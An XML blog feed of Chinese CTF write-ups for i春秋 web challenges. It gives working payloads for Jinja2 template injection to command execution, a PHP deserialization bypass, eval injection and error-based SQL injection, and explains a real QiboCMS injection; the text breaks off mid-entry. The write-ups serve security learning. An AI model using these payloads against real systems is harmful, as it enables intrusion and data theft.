      <link href="2021/05/05/i-chun-qiu-web-zone/"/>
      <url>2021/05/05/i-chun-qiu-web-zone/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/05/i-chun-qiu-web-zone/5bd4424eb057a35becb1bcdefa1e513.png" alt="5bd4424eb057a35becb1bcdefa1e513"></p><p><img src="/2021/05/05/i-chun-qiu-web-zone/dcde2241e79e9c544a3e51ff695a434.png" alt="dcde2241e79e9c544a3e51ff695a434"></p><p><img src="/2021/05/05/i-chun-qiu-web-zone/b1073fb6497f5a8f291a4d17922bf1c-1620205443760.png" alt="b1073fb6497f5a8f291a4d17922bf1c"></p><p><img src="/2021/05/05/i-chun-qiu-web-zone/0217231cc6d139dbfe81f2dbf3ccd6a-1620205448474.png" alt="0217231cc6d139dbfe81f2dbf3ccd6a"></p><p><img src="/2021/05/05/i-chun-qiu-web-zone/cadc5122fde6dc14284d9fd8d9b9f1b.png" alt="cadc5122fde6dc14284d9fd8d9b9f1b"></p><p><img src="/2021/05/05/i-chun-qiu-web-zone/5835aab478bd7dbd5efcc8089dbada1.png" alt="5835aab478bd7dbd5efcc8089dbada1"></p><p>直接访问下载也是可以的</p><p><img src="/2021/05/05/i-chun-qiu-web-zone/032dcbdbcf4d05dbf4bdffc7735673b.png" alt="032dcbdbcf4d05dbf4bdffc7735673b"></p>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-fuzz</title>
      <link href="2021/05/04/i-chun-qiu-web-fuzz/"/>
      <url>2021/05/04/i-chun-qiu-web-fuzz/</url>
      
        <content type="html"><![CDATA[<p>尝试到?name=123有响应</p><p><img src="/2021/05/04/i-chun-qiu-web-fuzz/54ac388556a196af663d2ff92856dbf.png" alt="54ac388556a196af663d2ff92856dbf"></p><p>尝试后发现那是python模板注入</p><p><img src="/2021/05/04/i-chun-qiu-web-fuzz/17e4537ea72479036d8f76a83cb2204.png" alt="17e4537ea72479036d8f76a83cb2204"></p><p>读版本文件：</p><pre><code>?name={{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/issue').read() }}</code></pre><p>向SSTI漏洞注入：</p><pre><code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg',  'w').write('from subprocess import check_output\n\nRUNCMD =  check_output\n') }}  </code></pre><p>（这将向远程服务器写入一个文件，当编译完成为subprocess模块引入check_output方法，并将其设置指向变量RUNCMD。）</p><p>向config对象添加一个新项：</p><pre><code>?name={{ config.from_pyfile('/tmp/owned.cfg') }}</code></pre><p>通过向SSTI漏洞注入来检测是否成功：</p><pre><code>?name={{ config['RUNCMD']('/usr/bin/id',shell=True) }}</code></pre><p>成功返回</p><p><img src="/2021/05/04/i-chun-qiu-web-fuzz/b9e8213208fff1dfcab326bceae2417-1620188922808.png" alt="b9e8213208fff1dfcab326bceae2417"></p><p>修改引号内容为ls</p><p><img src="/2021/05/04/i-chun-qiu-web-fuzz/87595f52406ee2000d003adb6c40911.png" alt="87595f52406ee2000d003adb6c40911"></p><p>没有返回，尝试ls -al</p><pre><code>?name={{ config['RUNCMD']('`echo bHMgLWFsCg== | base64 -d`',shell=True) }}</code></pre><p><img src="/2021/05/04/i-chun-qiu-web-fuzz/ebee99c8cdefcfac602bcecda6108ad.png" alt="ebee99c8cdefcfac602bcecda6108ad"></p><ul><li>Hello total 24</li><li>drwx——.  2 root root 4096 May  5 03:47 .</li><li>drwxr-xr-x. 21 root root 4096 May  5 03:47 ..</li><li>-rw——-.  1 root root  165 Nov  9  2016 .bash_history</li><li>-rw-r–r–.  1 root root 3106 Feb 20  2014 .bashrc</li><li>-rw-r–r–.  1 root root   18 Nov  8  2016 .config</li><li>-rw-r–r–.  1 root root  140 Feb 20  2014 .profile</li></ul><p>查看var/www/html下的文件名</p><pre><code>?name={{ config['RUNCMD']('`echo bHMgLWFsIC92YXIvd3d3L2h0bWwK | base64 -d`',shell=True) }}</code></pre><p><img src="/2021/05/04/i-chun-qiu-web-fuzz/2b80f651f715ca9f6e12ef75c4ef515.png" alt="2b80f651f715ca9f6e12ef75c4ef515"></p><ul><li>Hello total 48</li><li>drwxr-xr-x. 2 root root  4096 May  5 03:47 .</li><li>drwxr-xr-x. 3 root root  4096 Nov  9  2016 ..</li><li>-rw-r–r–  1 root root    43 May  5 03:47 fl4g</li><li>-rw-r–r–. 1 root root 34913 Nov  9  2016 x.py</li></ul><p>查看fl4g文件（cat var/www/html/fl4g）</p><pre><code>?name={{ config['RUNCMD']('`echo Y2F0IC92YXIvd3d3L2h0bWwvZmw0Zwo= | base64 -d`',shell=True) }}</code></pre><p><img src="/2021/05/04/i-chun-qiu-web-fuzz/150037e3effd632359f01b4c3663d15.png" alt="150037e3effd632359f01b4c3663d15"></p>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-Hash</title>
      <link href="2021/05/03/i-chun-qiu-web-hash/"/>
      <url>2021/05/03/i-chun-qiu-web-hash/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/03/i-chun-qiu-web-hash/db497ae3ef59f08ca53247fcccdaf07.png" alt="db497ae3ef59f08ca53247fcccdaf07"></p><p>源代码中：$hash=md5($sign.$key);the length of $sign is 8</p><p>index.php?key=111&amp;hash=adaa10eef3a02754da03b5a3a6f40ae6</p><p><img src="/2021/05/03/i-chun-qiu-web-hash/ad1712cf058b244469e8072040a775e.png" alt="ad1712cf058b244469e8072040a775e"></p><pre><code>&lt;?php class&nbsp;Demo&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;$file&nbsp;=&nbsp;'Gu3ss_m3_h2h2.php'; &nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;__construct($file)&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;file&nbsp;=&nbsp;$file; &nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;__destruct()&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;@highlight_file($this-&gt;file,&nbsp;true); &nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;__wakeup()&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($this-&gt;file&nbsp;!=&nbsp;'Gu3ss_m3_h2h2.php')&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//the&nbsp;secret&nbsp;is&nbsp;in&nbsp;the&nbsp;f15g_1s_here.php &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;file&nbsp;=&nbsp;'Gu3ss_m3_h2h2.php'; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;&nbsp;&nbsp;} } if&nbsp;(isset($_GET['var']))&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;$var&nbsp;=&nbsp;base64_decode($_GET['var']); &nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(preg_match('/[oc]:\d+:/i',&nbsp;$var))&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;die('stop&nbsp;hacking!'); &nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@unserialize($var); &nbsp;&nbsp;&nbsp;&nbsp;} }&nbsp;else&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;highlight_file("Gu3ss_m3_h2h2.php"); } ?&gt; </code></pre><p>上脚本</p><pre><code>&lt;?phpclass Demo {    private $file = 'Gu3ss_m3_h2h2.php';    public function __construct($file) {        $this-&gt;file = $file;    }    function __destruct() {        echo @highlight_file($this-&gt;file, true);    }    function __wakeup() {        if ($this-&gt;file != 'Gu3ss_m3_h2h2.php') {            //the secret is in the f15g_1s_here.php            $this-&gt;file = 'Gu3ss_m3_h2h2.php';        }    }}$a = new Demo('f15g_1s_here.php');$s = serialize($a);echo $s;echo '&lt;br&gt;';$s = str_replace('O:4', 'O:+4',$s);//绕过正则$s = str_replace(':1:', ':2:' ,$s);//绕过wakeup函数echo base64_encode($s);//最后base64编码?&gt;</code></pre><pre><code>Gu3ss_m3_h2h2.php?var=TzorNDoiRGVtbyI6ODp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==</code></pre><p>下个界面：</p><pre><code>&lt;?php if&nbsp;(isset($_GET['val']))&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;$val&nbsp;=&nbsp;$_GET['val']; &nbsp;&nbsp;&nbsp;&nbsp;eval('$value="'&nbsp;.&nbsp;addslashes($val)&nbsp;.&nbsp;'";'); }&nbsp;else&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;die('hahaha!'); } ?&gt; </code></pre><p>再审计，如果存在GET传入的val就令变量val等于其，然后eval一段内容，内容具体组成是value的值连上val的addslashes转义字符串再连上;组成<br>很明显了，这里就要我们利用eval()来获取到flag<br>先试试f15g_1s_here.php?val=${eval(“echo ‘ls’ ;”)}<br>发现页面没有显示了就。。。。看来不能这样用，因为上面的提示中提到了addslashes转义，它会将我们的’”都进行转义所以就不能这么构造eval指令<br>这里使用url的GET传值来避免val中的’ls’被转义构造payload：<br>f15g_1s_here.php?val=${eval($_GET[a])}&amp;a=echo <code>ls</code>;</p><p>查看到所有文件，再cat查看<br>Payload：<br>f15g_1s_here.php?val=${eval($_GET[a])}&amp;a=echo <code>cat True_F1ag_i3_Here_233.php</code>;<br>页面也没有回显，查看源码得到flag</p><p><img src="/2021/05/03/i-chun-qiu-web-hash/aee16a3bbadf0d90bd46e773cf55ede.png" alt="aee16a3bbadf0d90bd46e773cf55ede"></p>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-fuzzing</title>
      <link href="2021/05/02/i-chun-qiu-web-fuzzing/"/>
      <url>2021/05/02/i-chun-qiu-web-fuzzing/</url>
      
        <content type="html"><![CDATA[<p>![805a9f457750436f8de5ac8442cd01b](C:/Users/H3ng/AppData/Local/Temp/WeChat Files/e9a4ed1c33280a6351407e4ff28f074.png)</p><p><img src="/2021/05/02/i-chun-qiu-web-fuzzing/e9a4ed1c33280a6351407e4ff28f074-1620133312910.png" alt="e9a4ed1c33280a6351407e4ff28f074"></p><p><img src="https://img2018.cnblogs.com/blog/1712230/201909/1712230-20190911135451462-1664953434.png" alt="img"></p><p>或者：</p><pre><code>import hashlibmd5 = "1b4167610ba3f2ac426a68488dbd89be"s = "abcdefghijklmnopqrstuvwxyz1234567890"for i in s:    for j in s:        for k in s:            key = "ichunqiu"+i+j+k            if(hashlib.md5(key.encode("utf8")).hexdigest() == md5):                print(key)</code></pre><pre><code>ichunqiu105</code></pre><p><img src="/2021/05/02/i-chun-qiu-web-fuzzing/d9b926ce2870aef4573fef6cc22f1bc.png" alt="d9b926ce2870aef4573fef6cc22f1bc"></p><p>源码在x0.txt内，附上源码：</p><pre><code>function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {$ckey_length = 4;$key = md5($key ? $key : UC_KEY);$keya = md5(substr($key, 0, 16));$keyb = md5(substr($key, 16, 16));$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : '';$cryptkey = $keya . md5($keya . $keyc);$key_length = strlen($cryptkey);$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;$string_length = strlen($string);$result = '';$box = range(0, 255);$rndkey = array();for ($i = 0; $i &lt;= 255; $i++) {    $rndkey[$i] = ord($cryptkey[$i % $key_length]);}for ($j = $i = 0; $i &lt; 256; $i++) {    $j = ($j + $box[$i] + $rndkey[$i]) % 256;    $tmp = $box[$i];    $box[$i] = $box[$j];    $box[$j] = $tmp;}for ($a = $j = $i = 0; $i &lt; $string_length; $i++) {    $a = ($a + 1) % 256;    $j = ($j + $box[$a]) % 256;    $tmp = $box[$a];    $box[$a] = $box[$j];    $box[$j] = $tmp;    $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));}if ($operation == 'DECODE') {    if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {        return substr($result, 26);    } else {        return '';    }} else {    return $keyc . str_replace('=', '', base64_encode($result));}}</code></pre><p>这个好像就是一个函数，而且是一个解密函数，DECODE嘛<br> 我们直接调用这个函数来解密<br> 直接echo</p><pre><code>echo authcode("d116+lpzwYGeuOp97fQ8DbwUogjZvXwKdAMW1skwPQ6mU2kjOKC3b4bhsN7N9hq03qAfaAXEavDq5YxLilcpnCnuM5ClG8g",$operation = 'DECODE', $key = 'ichunqiu105', $expiry = 0);</code></pre><p>php脚本：</p><pre><code>&lt;?phpfunction authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {    $ckey_length = 4;    $key = md5($key ? $key : UC_KEY);    $keya = md5(substr($key, 0, 16));    $keyb = md5(substr($key, 16, 16));    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : '';    $cryptkey = $keya . md5($keya . $keyc);    $key_length = strlen($cryptkey);    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;    $string_length = strlen($string);    $result = '';    $box = range(0, 255);    $rndkey = array();    for ($i = 0; $i &lt;= 255; $i++) {        $rndkey[$i] = ord($cryptkey[$i % $key_length]);    }    for ($j = $i = 0; $i &lt; 256; $i++) {        $j = ($j + $box[$i] + $rndkey[$i]) % 256;        $tmp = $box[$i];        $box[$i] = $box[$j];        $box[$j] = $tmp;    }    for ($a = $j = $i = 0; $i &lt; $string_length; $i++) {        $a = ($a + 1) % 256;        $j = ($j + $box[$a]) % 256;        $tmp = $box[$a];        $box[$a] = $box[$j];        $box[$j] = $tmp;        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));    }    if ($operation == 'DECODE') {        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {            return substr($result, 26);        } else {            return '';        }    } else {        return $keyc . str_replace('=', '', base64_encode($result));    }}echo authcode($string = '9d9ezNRP5YbrHb40nkkbNmG4GcuMoHDky3fxTvwdpGQYClaNKgiYKVF7TuY+nsk2l05jNXMsBwFdhDeQOv+gxubgv4zIXn4', $operation = 'DECODE', $key = 'ichunqiu105');?&gt;</code></pre><p><img src="/2021/05/02/i-chun-qiu-web-fuzzing/6b216aa16bcb87f8baae8b35b34bb79.png" alt="6b216aa16bcb87f8baae8b35b34bb79"></p>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-EXEC</title>
      <link href="2021/05/01/i-chun-qiu-web-exec/"/>
      <url>2021/05/01/i-chun-qiu-web-exec/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/leixiao-/p/9786320.html">https://www.cnblogs.com/leixiao-/p/9786320.html</a></p><p>还没学linux过后来做</p>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-Vld</title>
      <link href="2021/04/30/i-chun-qiu-web-vld/"/>
      <url>2021/04/30/i-chun-qiu-web-vld/</url>
      
        <content type="html"><![CDATA[<p>扫描后台发现index.php,txt</p><pre><code>Finding entry pointsBranch analysis from position: 0Jump found. Position 1 = 23, Position 2 = 38Branch analysis from position: 23Jump found. Position 1 = 26, Position 2 = 35Branch analysis from position: 26Jump found. Position 1 = 29, Position 2 = 32Branch analysis from position: 29Jump found. Position 1 = 34Branch analysis from position: 34Jump found. Position 1 = 37Branch analysis from position: 37Jump found. Position 1 = 40Branch analysis from position: 40Return foundBranch analysis from position: 32Jump found. Position 1 = 37Branch analysis from position: 37Branch analysis from position: 35Jump found. Position 1 = 40Branch analysis from position: 40Branch analysis from position: 38Return foundfilename:       C:\ctf\index.phpfunction name:  (null)number of ops:  44compiled vars:  !0 = $a, !1 = $b, !2 = $cline     # *  op                           fetch          ext  return  operands---------------------------------------------------------------------------------   2     0  &gt;   EXT_STMT         1      ECHO                                                     'do+you+know+Vulcan+Logic+Dumper%3F%3Cbr%3E'   3     2      EXT_STMT         3      BEGIN_SILENCE                                    ~0         4      FETCH_R                      global              $1      '_GET'         5      FETCH_DIM_R                                      $2      $1, 'flag1'         6      END_SILENCE                                              ~0         7      ASSIGN                                                   !0, $2   4     8      EXT_STMT         9      BEGIN_SILENCE                                    ~4        10      FETCH_R                      global              $5      '_GET'        11      FETCH_DIM_R                                      $6      $5, 'flag2'        12      END_SILENCE                                              ~4        13      ASSIGN                                                   !1, $6   5    14      EXT_STMT        15      BEGIN_SILENCE                                    ~8        16      FETCH_R                      global              $9      '_GET'        17      FETCH_DIM_R                                      $10     $9, 'flag3'        18      END_SILENCE                                              ~8        19      ASSIGN                                                   !2, $10   6    20      EXT_STMT        21      IS_EQUAL                                         ~12     !0, 'fvhjjihfcv'        22    &gt; JMPZ                                                     ~12, -&gt;38   7    23  &gt;   EXT_STMT        24      IS_EQUAL                                         ~13     !1, 'gfuyiyhioyf'        25    &gt; JMPZ                                                     ~13, -&gt;35   8    26  &gt;   EXT_STMT        27      IS_EQUAL                                         ~14     !2, 'yugoiiyhi'        28    &gt; JMPZ                                                     ~14, -&gt;32   9    29  &gt;   EXT_STMT        30      ECHO                                                     'the+next+step+is+xxx.zip'  10    31    &gt; JMP                                                      -&gt;34  11    32  &gt;   EXT_STMT        33      ECHO                                                     'false%3Cbr%3E'  13    34  &gt; &gt; JMP                                                      -&gt;37  14    35  &gt;   EXT_STMT        36      ECHO                                                     'false%3Cbr%3E'  16    37  &gt; &gt; JMP                                                      -&gt;40  17    38  &gt;   EXT_STMT        39      ECHO                                                     'false%3Cbr%3E'  19    40  &gt;   NOP  22    41      EXT_STMT        42      ECHO                                                     '%3C%21--+index.php.txt+%3F%3E%0D%0A%0D%0A'        43    &gt; RETURN                                                   1branch: #  0; line:     2-    6; sop:     0; eop:    22; out1:  23; out2:  38branch: # 23; line:     7-    7; sop:    23; eop:    25; out1:  26; out2:  35branch: # 26; line:     8-    8; sop:    26; eop:    28; out1:  29; out2:  32branch: # 29; line:     9-   10; sop:    29; eop:    31; out1:  34branch: # 32; line:    11-   13; sop:    32; eop:    33; out1:  34branch: # 34; line:    13-   13; sop:    34; eop:    34; out1:  37branch: # 35; line:    14-   16; sop:    35; eop:    36; out1:  37branch: # 37; line:    16-   16; sop:    37; eop:    37; out1:  40branch: # 38; line:    17-   19; sop:    38; eop:    39; out1:  40branch: # 40; line:    19-   22; sop:    40; eop:    43path #1: 0, 23, 26, 29, 34, 37, 40,path #2: 0, 23, 26, 32, 34, 37, 40,path #3: 0, 23, 35, 37, 40,path #4: 0, 38, 40,do you know Vulcan Logic Dumper?&lt;br&gt;false&lt;br&gt;&lt;!-- index.php.txt ?&gt;</code></pre><p>为php opcodes，需要对其编译，</p><p>参照：<a href="https://www.cnblogs.com/wosun/p/11386434.html">https://www.cnblogs.com/wosun/p/11386434.html</a></p><p><img src="https://img2018.cnblogs.com/blog/1712230/201908/1712230-20190820233057014-1821050049.png" alt="img"></p><p>所以flag应满足三个条件：</p><p>然后访问1chunqiu.zip</p><p>其中login.php中存在注入漏洞：</p><pre><code>&lt;?phprequire_once 'dbmysql.class.php';require_once 'config.inc.php';if(isset($_POST['username']) &amp;&amp; isset($_POST['password']) &amp;&amp; isset($_POST['number'])){    $db = new mysql_db();    $username = $db-&gt;safe_data($_POST['username']);    $password = $db-&gt;my_md5($_POST['password']);    $number = is_numeric($_POST['number']) ? $_POST['number'] : 1;    $username = trim(str_replace($number, '', $username));    $sql = "select * from"."`".table_name."`"."where username="."'"."$username"."'";    $row = $db-&gt;query($sql);    $result = $db-&gt;fetch_array($row);    if($row){        if($result["number"] === $number &amp;&amp; $result["password"] === $password){            echo "&lt;script&gt;alert('nothing here!')&lt;/script&gt;";        }else{            echo "&lt;script&gt;            alert('密码错误，老司机翻车了!');            function jumpurl(){                location='login.html';            }            setTimeout('jumpurl()',1000);            &lt;/script&gt;";        }    }else{        exit(mysql_error());    }}else{    echo "&lt;script&gt;            alert('用户名密码不能为空!');            function jumpurl(){                location='login.html';            }            setTimeout('jumpurl()',1000);        &lt;/script&gt;";} ?&gt;</code></pre><p>其中username存在addslashes()处理（单引号，反斜杠等前面都会被加上反斜杠而转义，防御sql注入），单伤下面又存在$username = trim(str_replace($number, ‘’, $username));所以这里可以注入。</p><p>将number的值改为0，username的值改为%00’出现报错（%00‘ ，经过addslashes()处理后（addslashes()会在NULL前加 \ ,0等于NULL）是 \0\‘）</p><p>去掉0则会变成\’就让我们的单引号没有被注释</p><p>后台的执行语句就变成了select * from<code>users</code>where username=‘ \ ‘ ‘ 所以会报错</p><p>再根据1chunqiu.zip中的config.inc.php给的数据库信息一步一步报错查询下去得到flag</p><p><img src="https://img2018.cnblogs.com/blog/1712230/201909/1712230-20190902165656831-1580248640.png" alt="img"></p><pre><code>%00'and updatexml(1,substr((select flag from flag),1,41),1)#%00'and updatexml(1,substr((select flag from flag),12,41),1)#</code></pre><p><img src="/2021/04/30/i-chun-qiu-web-vld/de1f20c61a02d4c5739cf5e772066e9.png" alt="de1f20c61a02d4c5739cf5e772066e9"></p><p><img src="/2021/04/30/i-chun-qiu-web-vld/d7b9e103ac86ed98b291be7d6cf8437.png" alt="d7b9e103ac86ed98b291be7d6cf8437"></p><pre><code>flag{a7758b35-61e7-484e-85f8-edffb5059625}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-再见CMS</title>
      <link href="2021/04/29/i-chun-qiu-web-zai-jian-cms/"/>
      <url>2021/04/29/i-chun-qiu-web-zai-jian-cms/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/04/29/i-chun-qiu-web-zai-jian-cms/435a24540be807e64702b513922440a.png" alt="435a24540be807e64702b513922440a"></p><p>观察网站最下方，根据备案号搜到这是个齐博CMS，然后百度就可以搜到齐博CMS漏洞了</p><h2 id="齐博cms-userinfo注入"><a href="#齐博cms-userinfo注入" class="headerlink" title="齐博cms_userinfo注入"></a>齐博cms_userinfo注入</h2><p>就拿齐博整站系统为例。<br>看到/member/userinfo.php，112到114行：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//过滤不健康的字</span>$truename<span class="token operator">=</span><span class="token function">replace_bad_word</span><span class="token punctuation">(</span>$truename<span class="token punctuation">)</span>$introduce<span class="token operator">=</span><span class="token function">replace_bad_word</span><span class="token punctuation">(</span>$introduce<span class="token punctuation">)</span><span class="token punctuation">;</span>$address<span class="token operator">=</span><span class="token function">replace_bad_word</span><span class="token punctuation">(</span>$address<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p> 这几句过滤代码，意思是想过滤一些“不和谐”的词语。那我们看看这个replace_bad_word函数。</p><pre class=" language-java"><code class="language-java">function <span class="token function">replace_bad_word</span><span class="token punctuation">(</span>$str<span class="token punctuation">)</span><span class="token punctuation">{</span>global $Limitword<span class="token punctuation">;</span><span class="token annotation punctuation">@include_once</span><span class="token punctuation">(</span>ROOT_PATH<span class="token punctuation">.</span><span class="token string">"data/limitword.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">foreach</span><span class="token punctuation">(</span> $Limitword AS $old<span class="token operator">=</span><span class="token operator">></span>$<span class="token keyword">new</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">strlen</span><span class="token punctuation">(</span>$old<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">2</span> <span class="token operator">&amp;&amp;</span> $str<span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span>$old<span class="token punctuation">,</span><span class="token function">trim</span><span class="token punctuation">(</span>$<span class="token keyword">new</span><span class="token punctuation">)</span><span class="token punctuation">,</span>$str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> $str<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>实际上是一个str_replace，将旧的“不和谐”词语替换成新的“和谐”词语。那么替换列表从哪来？看看data/limitword.php：</p><pre class=" language-java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">?</span>php $Limitword<span class="token punctuation">[</span><span class="token string">'造反'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'造**'</span><span class="token punctuation">;</span>$Limitword<span class="token punctuation">[</span><span class="token string">'法轮功'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'法**功'</span><span class="token punctuation">;</span></code></pre><p> 就这两个，$Limitword并没有初值。而且include之前有global  $Limitword。齐博cms是将GET和POST变量注册成全局变量了，所以global取到的可以是$_POST[Limitword]或$_GET[Limitword]。也就是说$Limitword是我们可以控制的。<br> 也就是说，我们可以控制str_replace函数的三个参数。不知道还有没有人记得ecshop曾经的一个注入漏洞，原理相同，我再说一遍。<br> 某变量$str全局做过转义，导致%00转义成了\0.我们能够控制str_replace的前两个参数，则str_replace(‘0’, ‘’, $str)，再将0转换成空，则留下了\，这个\可以转义其后的\’，使之变成\’，导致单引号逃逸出转义符的限制，造成注入。<br> 这里的原理是一样的，只不过齐博cms之前对一些变量做了过滤：</p><pre class=" language-java"><code class="language-java">$truename<span class="token operator">=</span><span class="token function">filtrate</span><span class="token punctuation">(</span>$truename<span class="token punctuation">)</span><span class="token punctuation">;</span>$idcard<span class="token operator">=</span><span class="token function">filtrate</span><span class="token punctuation">(</span>$idcard<span class="token punctuation">)</span><span class="token punctuation">;</span>$telephone<span class="token operator">=</span><span class="token function">filtrate</span><span class="token punctuation">(</span>$telephone<span class="token punctuation">)</span><span class="token punctuation">;</span>$address<span class="token operator">=</span><span class="token function">filtrate</span><span class="token punctuation">(</span>$address<span class="token punctuation">)</span><span class="token punctuation">;</span>$introduce<span class="token operator">=</span><span class="token function">filtrate</span><span class="token punctuation">(</span>$introduce<span class="token punctuation">)</span><span class="token punctuation">;</span>$homepage<span class="token operator">=</span><span class="token function">filtrate</span><span class="token punctuation">(</span>$homepage<span class="token punctuation">)</span><span class="token punctuation">;</span>function <span class="token function">filtrate</span><span class="token punctuation">(</span>$msg<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//$msg = str_replace('&amp;','&amp;amp;',$msg);</span><span class="token comment" spellcheck="true">//$msg = str_replace(' ','&amp;nbsp;',$msg);</span>$msg <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'&amp;quot;'</span><span class="token punctuation">,</span>$msg<span class="token punctuation">)</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">'&amp;#39;'</span><span class="token punctuation">,</span>$msg<span class="token punctuation">)</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">"&amp;lt;"</span><span class="token punctuation">,</span>$msg<span class="token punctuation">)</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"&amp;gt;"</span><span class="token punctuation">,</span>$msg<span class="token punctuation">)</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"\t"</span><span class="token punctuation">,</span><span class="token string">"   &amp;nbsp;  &amp;nbsp;"</span><span class="token punctuation">,</span>$msg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//$msg = str_replace("\r","",$msg);</span>$msg <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"   "</span><span class="token punctuation">,</span><span class="token string">" &amp;nbsp; "</span><span class="token punctuation">,</span>$msg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> $msg<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>将’等敏感字符过滤了。就算有一个\可以转义一个’，但是这里连’都引入不了。<br> 没关系，这个文件是更新用户信息用的，执行的语句类似update table set a=’111’,b=’222’ where  uid=1，我们引入一个\在111的最后，转义掉111后面的引号，这样222就逃逸出了限制，我们的sql注入语句就可以放在222的位置执行了。这个和之前discuz7.2的faq.php那个注入类似： WooYun: Discuz7存在一处SQL注射漏洞（无需登录即可触发）<br> 所以，完美构造了一个SQL注入。</p><p>先注册一个用户：</p><p><img 